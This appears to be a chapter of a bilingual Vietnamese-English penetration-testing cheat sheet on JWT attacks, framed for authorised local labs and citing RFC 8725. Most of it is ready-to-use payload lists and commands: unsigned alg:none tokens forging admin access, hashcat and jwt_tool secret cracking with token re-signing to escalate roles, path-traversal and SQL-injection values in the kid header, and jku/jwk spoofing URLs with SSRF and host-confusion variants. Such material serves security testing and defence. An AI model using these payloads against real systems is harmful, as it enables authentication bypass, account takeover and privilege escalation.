# 8. JWT Attacks

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

JWT Attacks xảy ra khi ứng dụng cấu hình hoặc xác thực JSON Web Token (JWT) không an toàn, cho phép kẻ tấn công chỉnh sửa nội dung token, giả mạo chữ ký hoặc thay đổi phân quyền.

### 8.1. Alg None Attacks
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Token JWT được sử dụng để xác thực người dùng qua Cookie hoặc Authorization header.
    *   *English*: JWT token format is present inside HTTP requests, containing metadata parameters in header block.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Giải mã token, thay đổi giá trị thuộc tính `"alg"` thành `"none"` (hoặc biến thể), xóa chữ ký và gửi lại.
    *   *English*: Decode token, change signature algorithm header value to `none`, strip signature block and verify.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-08-001 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.1. Alg None Attacks -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: only the deliberately vulnerable validator accepts an unsigned synthetic token; the fixed validator rejects it because the algorithm allowlist requires a signature -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=        # {"alg":"none","typ":"JWT"}
Header: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=        # {"alg":"NONE","typ":"JWT"}
Header: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0=        # {"alg":"nOnE","typ":"JWT"}
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ey...    # Unsigned token with alg:none (needs trailing dot)
Token: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.ey...    # Unsigned token with alg:NONE (needs trailing dot)
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ey...    # Trailing dot omitted filter bypass test
Header: eyJhbGciOiJub25lIiwiZXh0cmEiOiJ0ZXN0In0=    # Obfuscated parameter header test
Token: eyJhbGciOiJub25lIn0.ey...                     # Minimally structured none algorithm header
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ey...    # Encoded none algorithm token bypass
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0. # Long expiry none admin token
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng công cụ jwt_tool để tự động quét lỗi thuật toán "none" trên token.
    *   *English*: Use jwt_tool to automate none algorithm checking and signature bypass tests.
<!-- payload-id: CHEAT-08-002 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.1. Alg None Attacks -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the deliberately vulnerable validator accepts an unsigned synthetic token; the fixed validator rejects it because the algorithm allowlist requires a signature; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python jwt_tool.py <JWT_TOKEN> -X a
    ```


---

### 8.2. Weak Secret Exploitation (HS256)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Token được ký bằng thuật toán đối xứng HS256 và khóa bí mật được đặt đơn giản.
    *   *English*: Token header specifies HS256 algorithm and relies on common passwords as signing secret.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Trích xuất chữ ký và sử dụng danh sách từ khóa phổ biến để bẻ khóa khóa bí mật HS256 ngoại tuyến.
    *   *English*: Extract JWT token string and perform offline wordlist brute-forcing against HS256 secret.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-08-003 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.2. Weak Secret Exploitation (HS256) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the bounded lab wordlist recovers only the intentionally weak HS256 fixture secret; a generated high-entropy key is not searched or exposed; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```bash
    # 1. Save JWT token to file for hashcat cracking (mode 16500 = JWT/JWS)
    echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' > jwt_hash.txt

    # 2. Crack JWT secret using hashcat GPU brute-force (rockyou wordlist)
    hashcat -a 0 -m 16500 jwt_hash.txt rockyou.txt

    # 3. Crack JWT secret using hashcat with common passwords wordlist
    hashcat -a 0 -m 16500 jwt_hash.txt /usr/share/wordlists/fasttrack.txt

    # 4. Crack JWT secret using hashcat with mask (brute-force short secrets)
    hashcat -a 3 -m 16500 jwt_hash.txt '?a?a?a?a?a?a'

    # 5. jwt_tool offline dictionary attack (scans all common weak secrets)
    python jwt_tool.py <JWT_TOKEN> -C -d rockyou.txt

    # 6. jwt_tool crack with a known common weak secrets list
    python jwt_tool.py <JWT_TOKEN> -C -d /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

    # 7. Forge/re-sign JWT with cracked secret, escalate role to admin
    python jwt_tool.py <JWT_TOKEN> -S hs256 -k <CRACKED_SECRET> -I -pc sub -pv admin

    # 8. Forge JWT with cracked secret, set is_admin=true
    python jwt_tool.py <JWT_TOKEN> -S hs256 -k <CRACKED_SECRET> -I -pc is_admin -pv true

    # 9. Python PyJWT script to verify a guessed secret offline
    python -c "import jwt; print(jwt.decode('<JWT_TOKEN>', 'secret', algorithms=['HS256']))"

    # 10. Python loop to brute-force common weak HS256 secrets manually
    python -c "
import jwt, sys
weakkeys = ['secret','admin','password','123456','jwt','key','development','test','system','letmein']
for k in weakkeys:
    try:
        payload = jwt.decode('<JWT_TOKEN>', k, algorithms=['HS256'])
        print('Cracked! Secret:', k, 'Payload:', payload); break
    except: pass
"
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng hashcat để bẻ khóa chữ ký JWT cực nhanh bằng GPU.
    *   *English*: Run hashcat to brute force weak HS256 keys from JWT files.
<!-- payload-id: CHEAT-08-004 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.2. Weak Secret Exploitation (HS256) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the bounded lab wordlist recovers only the intentionally weak HS256 fixture secret; a generated high-entropy key is not searched or exposed; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    hashcat -a 0 -m 16500 jwt_hash.txt rockyou.txt
    ```


---

### 8.3. kid Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Phần header của JWT chứa tham số `"kid"` (Key ID) dùng để chỉ định khóa giải mã trong cơ sở dữ liệu hoặc hệ thống tệp.
    *   *English*: JWT token header contains `kid` parameter pointing to public keys or databases.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn các ký tự Path Traversal (để tải tệp rỗng `/dev/null`) hoặc SQL Injection vào thuộc tính `"kid"`.
    *   *English*: Inject directory traversal sequences or SQL clauses into the `kid` property.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-08-005 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.3. kid Injection -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable key resolver reaches only the synthetic key-path marker; the fixed resolver maps an opaque kid to a server-controlled key and rejects path/SQL syntax -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
{"alg":"HS256","kid":"../../../../dev/null"}         # Path traversal to load empty key from /dev/null
{"alg":"HS256","kid":"/dev/null"}                   # Absolute path traversal to load empty key
{"alg":"HS256","kid":"1' UNION SELECT 'mykey'-- -"} # SQLi in kid parameter. The SQL engine returns a row containing the attacker's chosen symmetric key 'mykey', forcing the application to use it for signature validation.
{"alg":"HS256","kid":"' UNION SELECT CHAR(109,121,107,101,121)--"} # SQLi bypass using CHAR representation
{"alg":"HS256","kid":"1' OR 1=1--"}                  # Basic SQLi bypass query
{"alg":"HS256","kid":"../../../../tmp/sechub-lab/key.txt"} # Synthetic key-path traversal probe
{"alg":"HS256","kid":"..\\..\\..\\..\\dev\\null"}   # Windows directory traversal for null key load
{"alg":"HS256","kid":"c:\\sechub-lab\\key.txt"}      # Windows synthetic key-path traversal probe
{"alg":"HS256","kid":"%2e%2e%2f%2e%2e%2fdev%2fnull"} # URL encoded traversal path injection
{"alg":"HS256","kid":"../../../../tmp/sechub-lab/key.txt%00"} # Legacy-only null-byte case; reject on current fixtures
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng jwt_tool với cờ inject header để chèn payload vào tham số kid.
    *   *English*: Run jwt_tool using custom header parameters to inject exploit signatures inside the kid parameter.
<!-- payload-id: CHEAT-08-006 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.3. kid Injection -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable key resolver reaches only the synthetic key-path marker; the fixed resolver maps an opaque kid to a server-controlled key and rejects path/SQL syntax; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../../../dev/null"
    ```


---

### 8.4. JWK / JKU Injection (JWKS Spoofing)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Header của token chứa thuộc tính `"jwk"` hoặc `"jku"` (JSON Web Key Set URL).
    *   *English*: Token header specifies `jwk` (JSON Web Key) or `jku` (JSON Web Key set URL) properties.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi `"jku"` trỏ về máy chủ do bạn kiểm soát chứa khóa công khai tự tạo của bạn và ký lại token. Kẻ tấn công ký token bằng khóa tư (private key) và máy chủ nạn nhân xác thực bằng khóa công khai tải về từ URL JKU.
    *   *English*: Modify `jku` to point to an attacker-controlled domain hosting a custom JWKS keys file (e.g. `keys.json`). The attacker signs the forged token with their private key, and the server verifies it using the public key fetched from the JKU endpoint.
        Minimal valid JWKS JSON schema (`keys.json`) to host:
<!-- payload-id: CHEAT-08-007 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.4. JWK / JKU Injection (JWKS Spoofing) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 JSON without comments; the request/JWK document is parsed exactly once and string escapes are preserved -->
<!-- expected-result: the vulnerable validator accepts only the lab attacker key/JWKS; the fixed validator ignores inline keys and fetches a pinned HTTPS issuer/JWKS identity -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
        ```json
        {
          "keys": [
            {
              "kty": "RSA",
              "use": "sig",
              "kid": "key1",
              "alg": "RS256",
              "n": "modulus-value-here",
              "e": "AQAB"
            }
          ]
        }
        ```
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-08-008 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.4. JWK / JKU Injection (JWKS Spoofing) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable validator accepts only the lab attacker key/JWKS; the fixed validator ignores inline keys and fetches a pinned HTTPS issuer/JWKS identity -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"attacker-modulus..."}} # Attacker public key inline injection
{"alg":"RS256","jku":"http://callback.lab.test/keys.json","kid":"key1"} # Attacker JKU URL endpoint injection
{"alg":"RS256","jku":"https://trusted-domain.com.callback.lab.test/keys.json"} # Open redirect domain bypass test
{"alg":"RS256","jku":"http://127.0.0.1/keys.json"}   # SSRF key retrieval test on local address
{"alg":"RS256","jku":"http://localhost:8080/keys.json"} # SSRF alternative localhost port test
{"alg":"RS256","jku":"https://trusted.lab.test/oauth/../keys.json"} # Path traversal in JKU URL parameter
{"alg":"RS256","jku":"http://callback.lab.test%2f@trusted.lab.test/keys.json"} # Host spoofing bypass test
{"alg":"RS256","jku":"http://callback.lab.test:80#@trusted.lab.test/keys.json"} # Fragment host spoofing bypass
{"alg":"RS256","jku":"http://callback.lab.test/jku.json?trusted.lab.test"} # Query parameter spoofing bypass
{"alg":"RS256","jku":"http://trusted.lab.test@callback.lab.test/keys.json"} # Basic authentication host spoofing
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng jwt_tool để cấu hình khóa giả mạo và tự động ký lại JWT.
    *   *English*: Use jwt_tool with custom keys to automate JWK injection.
<!-- payload-id: CHEAT-08-009 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.4. JWK / JKU Injection (JWKS Spoofing) -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable validator accepts only the lab attacker key/JWKS; the fixed validator ignores inline keys and fetches a pinned HTTPS issuer/JWKS identity; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python jwt_tool.py <JWT_TOKEN> -j -k attacker_key.pem
    ```

---

## Tài liệu tham khảo

- **[S1]** RFC 8725 — JSON Web Token Best Current Practices. https://www.rfc-editor.org/rfc/rfc8725.html — BCP 225; truy cập: 2026-07-18.
